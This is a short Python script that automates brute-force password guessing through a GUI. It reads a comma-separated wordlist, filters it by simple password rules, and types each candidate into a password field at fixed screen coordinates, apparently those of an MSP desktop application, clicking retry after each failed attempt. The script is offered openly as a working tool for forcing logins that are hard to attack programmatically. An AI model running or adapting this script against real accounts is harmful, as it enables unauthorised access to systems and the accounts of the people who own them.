#!/usr/bin/python

import datetime
import time

import py
import pyautogui

'''
This program rapidly enters words into a field and presses enter.
This is meant for situations where you have to manually brute force a login page.
Example: A login page that uses flash so it is not easy to programatically brute force
the login. To use run this program from a command prompt and click in the filed you
want to enter passwords into. Program will start after 5 seconds. This works in Chrome.
'''

def textprompt():
	x = pyautogui.confirm('Click OK to begin then click in the password field. Brute force starts after 5 seconds. Cancel to Exit.')
	if x == 'Cancel':
		exit()
	else:
		#change wordlist text/.csv file here
		passcrack('passwordCommas.txt')

def passcrack(file_name):
	word_file = open(file_name,'r')
	words = word_file.read()
	word_file.close()
	word_list = words.split(',')
	time.sleep(5)
	symbols = ["!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "-", "+", "="]
	for word in word_list[0::]:
		if len(word) >= 6 and not any(symbol in word for symbol in symbols) and not word.isdigit() and any(char.isdigit() for char in word):
		#  password length                  no symbols                          no all number pass                 atleast on digit
			pyautogui.click(x=1419, y=576) # Selecting password field for MSP desktop application
			pyautogui.hotkey('ctrl','a')
			pyautogui.typewrite(word, interval=0.0001)
			pyautogui.typewrite(['enter'])
			time.sleep(1)
			pyautogui.click(x=1129, y=552) # Clicking retry for MSP desktop application
			print(word)

'''	
 Add a break stateme
 nt that uses pyautogui pixel matching to determine if it logged in or not.
https://www.programiz.com/python-programming/break-continue 
'''

textprompt()
